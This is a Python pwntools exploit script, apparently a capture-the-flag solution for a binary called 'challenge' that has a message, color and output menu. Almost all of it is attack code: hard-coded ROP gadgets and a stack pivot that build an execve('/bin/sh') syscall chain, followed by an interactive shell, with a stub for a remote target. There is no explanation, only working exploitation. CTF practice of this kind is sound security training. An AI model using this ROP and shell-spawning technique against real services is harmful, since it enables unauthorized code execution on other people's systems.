#!/usr/bin/env python3

from pwn import *

context.terminal = ["foot", "-e", "sh", "-c"]

exe = ELF('challenge', checksec=False)
# libc = ELF('libc.so.6', checksec=False)
context.binary = exe

info = lambda msg: log.info(msg)
s = lambda data, proc=None: proc.send(data) if proc else p.send(data)
sa = lambda msg, data, proc=None: proc.sendafter(msg, data) if proc else p.sendafter(msg, data)
sl = lambda data, proc=None: proc.sendline(data) if proc else p.sendline(data)
sla = lambda msg, data, proc=None: proc.sendlineafter(msg, data) if proc else p.sendlineafter(msg, data)
sn = lambda num, proc=None: proc.send(str(num).encode()) if proc else p.send(str(num).encode())
sna = lambda msg, num, proc=None: proc.sendafter(msg, str(num).encode()) if proc else p.sendafter(msg, str(num).encode())
sln = lambda num, proc=None: proc.sendline(str(num).encode()) if proc else p.sendline(str(num).encode())
slna = lambda msg, num, proc=None: proc.sendlineafter(msg, str(num).encode()) if proc else p.sendlineafter(msg, str(num).encode())
def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
        b*0x243a6f
        # b*0x2a653b
        c
        ''')
        sleep(1)

# 0x3453a29e
if args.REMOTE:
    p = remote('')
else:
    p = process([exe.path])
GDB()

def message(msg):
    slna(b'> ', 1)
    sla(b'New Message? ', msg)

def color(color):
    slna(b'> ', 2)
    slna(b'> ', color)

def output():
    slna(b'> ', 3)

rsp  =0x0000000000242d78 #  xchg rsp, rax ; ret
pop_rdi  = 0x00000000002a1345 # pop rdi ; pop rbp ; xor eax, eax ; ret
push_rdi = 0x0000000000247a76 # push rdi ; push rax ; ret
pop_rsi = 0x0000000000243431 # pop rsi
xor_edx = 0x00000000002d3d7b #  xor edx, edx ; mov rax, rdi ; pop rbp ; ret
syscall = 0x00000000002a6602
mov_rax = 0x2e4416 # mov rax, rsi ; ret
pop_r13_14_15 = 0x0000000000245203 # pop r13 ; pop r14 ; pop r15 ; ret

load = flat(
    pop_rdi,
    b'/bin/sh\0',
    0,
    # push_rdi, # push rdi ; push rax ; ret
    # pop_rdi, # pop rdi ; pop rbp ; xor eax, eax ; ret

    xor_edx,
    0,
    pop_rsi,
    0x3b,
    mov_rax,
    pop_rsi,
    0,
    syscall,
    rsp,
)
# 0x243abb
message(load)
color(4789)

output()

# message(p64(pop_rdi))
# 
# output()

p.interactive()
